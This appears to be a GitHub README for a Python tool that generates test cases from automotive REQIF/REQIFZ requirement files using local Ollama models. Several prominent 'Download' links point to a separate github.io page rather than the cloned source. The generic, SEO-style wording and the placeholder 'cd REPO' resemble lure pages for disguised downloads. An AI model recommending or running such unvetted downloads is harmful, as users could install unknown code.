# AI Test Case Generator v2.3.0 - test case generator 2026

> **AI Test Case Generator** is a Python tool for converting automotive requirements from REQIF and REQIFZ files into organized test case outputs. Version 2.3.0 includes local model integration, asynchronous execution, and updated generation workflows.

[![Platform](https://img.shields.io/badge/Platform-Python-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2.3.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/tyler-moorejgu3452/ai-requirements-test-generator?style=flat-square)](https://github.com/tyler-moorejgu3452/ai-requirements-test-generator)

---

<p align="center">
  <a href="https://tyler-moorejgu3452.github.io/ai-requirements-test-generator/">
    <img src="https://img.shields.io/badge/Download-AI%20Test%20Case%20Generator%20Latest-brightgreen?style=for-the-badge" alt="Download AI Test Case Generator">
  </a>
</p>

> **[Download AI Test Case Generator v2.3.0](https://tyler-moorejgu3452.github.io/ai-requirements-test-generator/)**

---

[Download Latest Build](https://tyler-moorejgu3452.github.io/ai-requirements-test-generator/)

---

## Overview

AI Test Case Generator helps teams turn automotive requirement data into structured test cases while reducing repetitive manual work. Its REQIF and REQIFZ support fits requirement-based testing processes that need to convert specification content into practical test artifacts.

The application can connect to local LLMs through Ollama and supports text, vision, and hybrid model workflows. This allows processing to account for written requirements as well as diagrams and other image-based content. Outputs are intended to remain convenient for review, while asynchronous execution helps handle larger collections of requirements.

---

## Capabilities

- Creates test cases from automotive requirements stored in REQIF or REQIFZ files
- Connects to locally hosted LLM models using Ollama
- Provides text-model, vision-model, and hybrid model selection
- Retrieves embedded images from REQIFZ archives
- Uses requirement context during processing to support higher-quality generated tests
- Runs concurrent asynchronous processing to improve throughput
- Writes generated results in Excel and JSON formats
- Offers an optional RAFT training workflow

---

## Getting Started

Retrieve the repository or project files and prepare the Python environment:

    git clone https://github.com/tyler-moorejgu3452/ai-requirements-test-generator.git
    cd REPO
    python -m venv .venv
    # activate the virtual environment for your platform
    pip install -r requirements.txt

Once dependencies are installed, launch the project's primary application or CLI entry point. Ollama must also be available when using local model inference.

---

## Running the Generator

A standard run generally follows this sequence:

1. Import a REQIF or REQIFZ requirements file.
2. Select text, vision, or hybrid model processing.
3. Generate test cases from the loaded requirements.
4. Inspect the generated content and export it as Excel or JSON.

Sample commands:

    python main.py --input path/to/requirements.reqif
    python main.py --input path/to/requirements.reqifz --model vision
    python main.py --input path/to/requirements.reqif --export excel

When the source is a REQIFZ archive, embedded images may be extracted before generation. This makes image-related requirement information available during processing.

---

## Settings

Project configuration is generally supplied through its settings files or environment variables used by the Python runtime and Ollama connection. Available configuration areas include model selection, processing mode, output type, and parameters associated with RAFT training.

Example layout:

    {
      "model_mode": "hybrid",
      "llm_provider": "ollama",
      "output_format": ["excel", "json"],
      "async_processing": true
    }

Choose values that match the local installation, the models available through Ollama, and the amount of requirement data being processed.

---

## System Requirements

- A Python runtime
- Local LLM model access through Ollama
- Disk capacity for source requirements, extracted images, and generated files
- Sufficient system resources to run concurrent processing
- Optional tooling for Excel output
- Optional environment for RAFT training workflows

---

## Frequently Asked Questions

**Which requirement formats are supported?**  
Both automotive REQIF and REQIFZ files are supported.

**Is a hosted LLM service required?**  
No. The workflow supports local model execution through Ollama.

**Can results be exported in different formats?**  
Yes. Excel and JSON are included among the available output formats.

**How are requirements containing many images handled?**  
REQIFZ packages support embedded image extraction. For image-oriented content, the vision processing path can also be selected.

**Where can I find project changes and new builds?**  
Repository activity and releases contain the latest build information and project updates.

**How can I adjust generation behavior?**  
Experiment with the selected model and configuration settings. RAFT training options can also be reviewed when tuning the workflow for a particular dataset.

---

## License

This project is available under the GNU GPL v3.0. See [LICENSE](LICENSE) for the full license details.
